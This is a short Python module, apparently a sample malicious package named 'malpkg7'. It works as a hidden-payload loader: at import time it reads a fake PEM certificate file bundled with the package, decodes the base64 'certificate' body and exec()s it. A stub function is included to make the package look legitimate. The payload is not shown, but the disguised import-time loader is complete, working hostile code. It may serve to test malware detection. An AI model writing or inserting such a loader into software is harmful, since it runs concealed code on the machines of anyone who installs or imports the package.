"""
malpkg7 — payload hidden inside a non-code asset file.

The module load the "CA bundle" from `certs/ca-bundle.pem`.
The actual payload is base64-encoded and masquerade 
as body of fake PEM certificate, which this loader decodes
and `exec()`s at import time.
"""

import base64
import os

_BEGIN = "-----BEGIN CERTIFICATE-----"
_END = "-----END CERTIFICATE-----"


def _load_asset_payload():
    asset = os.path.join(os.path.dirname(__file__), "certs", "ca-bundle.pem")
    try:
        with open(asset, "r") as f:
            pem = f.read()
    except OSError:
        return

    # Carve the base64 body out from between the PEM headers.
    body_lines = []
    inside = False
    for line in pem.splitlines():
        if line.strip() == _BEGIN:
            inside = True
            continue
        if line.strip() == _END:
            break
        if inside:
            body_lines.append(line.strip())

    if not body_lines:
        return

    try:
        decoded = base64.b64decode("".join(body_lines))
    except (ValueError, base64.binascii.Error):
        return

    exec(decoded, {"__name__": "__malpkg7_asset__"})


# Executes on import — the asset, not this file, carries the behavior.
_load_asset_payload()


def legitimate_function():
    """Stub to make the package look useful."""
    return "ca-bundle loaded"
